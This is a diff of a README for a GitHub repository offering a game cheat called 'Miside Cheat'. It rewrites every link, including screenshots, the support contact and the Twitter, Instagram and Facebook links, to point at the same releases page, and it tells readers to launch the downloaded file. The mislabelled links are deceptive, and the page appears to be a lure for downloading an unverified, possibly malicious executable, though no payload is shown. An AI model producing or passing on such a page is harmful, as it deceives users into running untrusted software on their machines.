@@ -10,7 +10,7 @@ Welcome to the official GitHub repository for **Miside Cheat** - your go-to sour
 
 ## Quick Access
 
-🔗 **Download App:** Get the latest version of Miside Cheat by clicking [here](https://github.com/project/files/App.zip)
+🔗 **Download App:** Get the latest version of Miside Cheat by clicking [here](https://github.com/MAYKOLINGUI/Miside-Cheat/releases)
 
 *(Note: Please remember to launch the downloaded file)*
 
@@ -39,20 +39,20 @@ Welcome to the official GitHub repository for **Miside Cheat** - your go-to sour
 
 ## Screenshots
 
-![Miside Cheat Screenshot 1](https://example.com/screenshot1.png)
-![Miside Cheat Screenshot 2](https://example.com/screenshot2.png)
+![Miside Cheat Screenshot 1](https://github.com/MAYKOLINGUI/Miside-Cheat/releases)
+![Miside Cheat Screenshot 2](https://github.com/MAYKOLINGUI/Miside-Cheat/releases)
 
 ## Support
 
-For any issues or inquiries, please check the **Releases** section or reach out to our support team at [support@misidecheat.com](mailto:support@misidecheat.com).
+For any issues or inquiries, please check the **Releases** section or reach out to our support team at [https://github.com/MAYKOLINGUI/Miside-Cheat/releases](https://github.com/MAYKOLINGUI/Miside-Cheat/releases).
 
 ## Stay Connected
 
 Follow us on social media for the latest updates and announcements:
 
-🐦 [Twitter](https://twitter.com/misidecheat)
-📷 [Instagram](https://instagram.com/misidecheat)
-📘 [Facebook](https://facebook.com/misidecheat)
+🐦 [Twitter](https://github.com/MAYKOLINGUI/Miside-Cheat/releases)
+📷 [Instagram](https://github.com/MAYKOLINGUI/Miside-Cheat/releases)
+📘 [Facebook](https://github.com/MAYKOLINGUI/Miside-Cheat/releases)
 
 ## Disclaimer
 
